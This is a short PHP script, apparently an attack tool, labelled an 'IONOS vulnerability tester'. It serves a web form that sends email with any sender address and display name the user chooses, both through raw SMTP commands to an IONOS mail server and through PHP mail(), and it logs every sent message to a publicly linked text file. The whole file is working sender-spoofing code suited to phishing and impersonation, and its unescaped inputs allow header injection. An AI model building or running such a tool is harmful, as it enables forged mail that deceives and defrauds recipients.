<?php
// v1.0.2
// scripted by @n4zgu1

if(isset($_POST['email'])) {
    $senderMail = $_POST['transmitter'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $headers = "From:  ". $_POST['fname'] . " <$senderMail>";
    $to = $_POST['email'];

    $smtpServer = "smtp.ionos.de";
    $port = 587;

    $socket = fsockopen($smtpServer, $port, $errno, $errstr, 30);

    if (!$socket) {
        echo "$errstr ($errno)<br>\n";
    } else {
        fputs($socket, "HELO $smtpServer\r\n");
        fputs($socket, "MAIL FROM: <$senderMail>\r\n");
        fputs($socket, "RCPT TO: <$to>\r\n");
        fputs($socket, "DATA\r\n");
        fputs($socket, "Subject: $subject\r\n");
        fputs($socket, "$headers\r\n");
        fputs($socket, "$message\r\n");
        fputs($socket, ".\r\n");
        fputs($socket, "QUIT\r\n");
        fclose($socket);
    }
    if (mail($to, $subject, $message, $headers)) {
        echo "<h4 style='color: white;'>Mail sent to $to</h4>";
    } else {
        echo "<h4 style='color: white;'>Mail not sent</h4>";
    }
    $date = date("d.m.Y H:i:s");
    file_put_contents("mails.txt", "$date\nFrom: $senderMail\nTo: $to\nSubjec: $subject\nMessage: $message\n\n", FILE_APPEND);

}

    echo "
    <body style='background-color: #1e1e1e;'>
    <h1 style='color: white;'>IONOS vulnerability tester</h1>
    <form method='post' action=''>
    <input type='email' name='transmitter' placeholder='Sender address'>
    <input type='email' name='email' placeholder='email'>
    <input type='text' = name='fname' placeholder='Name'>
    <input type='text' = name='subject' placeholder='subject'>
    <input type='text' = name='message' placeholder='message'>
    <input type='submit' value='Send'>
    </form>
    <button onclick='window.location.href = \"mails.txt\";'>Log</button>
    <button onclick='window.location.href = \"dns.php\";'>DNS</button>
    </body>
    ";
?>